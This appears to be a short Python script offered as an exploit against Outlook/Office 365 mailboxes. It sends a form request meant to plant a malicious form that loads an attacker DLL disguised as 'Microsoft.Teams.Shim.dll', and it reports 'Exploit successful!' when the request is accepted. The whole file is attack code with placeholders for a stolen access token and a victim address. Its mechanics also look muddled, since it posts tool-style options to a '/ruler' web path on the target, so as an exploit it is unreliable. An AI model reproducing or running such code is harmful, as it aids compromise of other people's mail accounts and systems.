import requests

# Change these values to match your target environment
target_url = 'https://outlook-target.com'
access_token = 'YOUR_ACCESS_TOKEN_HERE'
recipient_email = 'target@example.com'
dll_path = 'path/to/malicious.dll'
clsid = '{00000000-0000-0000-0000-000000000001}'  # Replace with a valid CLSID

# Craft the form data for the request
form_data = {
    'token': access_token,
    'email': recipient_email,
    'o365': True,
    'debug': True,
    'form': 'add-com',
    'dll': dll_path,
    'suffix': 'Evil',
    'clsid': clsid,
    'name': 'Microsoft.Teams.Shim.dll',
    'send': True
}

# Send the request to the Ruler endpoint
response = requests.post(f'{target_url}/ruler', data=form_data)

# Check if the request was successful
if response.status_code == 200:
    print('Exploit successful! Malicious form sent to target.')
else:
    print('Exploit failed! Check your parameters and try again.')
